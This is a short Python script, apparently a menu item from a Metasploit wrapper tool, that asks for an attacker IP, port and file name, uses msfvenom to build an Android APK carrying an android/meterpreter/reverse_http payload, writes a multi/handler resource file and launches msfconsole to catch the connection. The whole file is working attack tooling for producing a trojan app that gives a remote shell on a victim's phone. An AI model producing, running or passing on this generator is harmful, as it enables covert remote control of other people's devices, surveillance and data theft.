import os

banner="""

 /'\_/`\          /'___\ 
/\      \    ____/\ \__/ 
\ \ \__\ \  /',__\ \ ,__|
 \ \ \_/\ \/\__, `\ \ \_/                 
  \ \_\\ \_\/\____/\ \_\ 
   \/_/ \/_/\/___/  \/_/ 

/\  _`\ /\ \            /\_ \  /\_ \     
\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
   /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ `\____\ \_\ \_\ \____\/\____\/\____|
    \/_____/\/_/\/_/\/____/\/____/\/____/

"""
def and_http():
    os.system("clear")
    print(banner)
    print("Using: android/meterpreter/reverse_http")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the apk: ")
    print("Ok!")
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: android/meterpreter/reverse_http")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p android/meterpreter/reverse_http LHOST="+ip+" LPORT="+port+" > "+name+".apk")
    print("Payload created! [01]")
    print("Saved in: "+name+".apk")
    print("Running metasploit-framework...")
    os.system("echo 'use exploit/multi/handler' >> android_http.rb")
    os.system("echo 'set payload android/meterpreter/reverse_http' >> android_http.rb")
    os.system("echo 'set LHOST "+ip+"' >> android_http.rb")
    os.system("echo 'set LPORT "+port+"' >> android_http.rb")
    os.system("echo 'exploit' >> android_http.rb")
    os.system("gnome-terminal -- msfconsole -r android_http.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")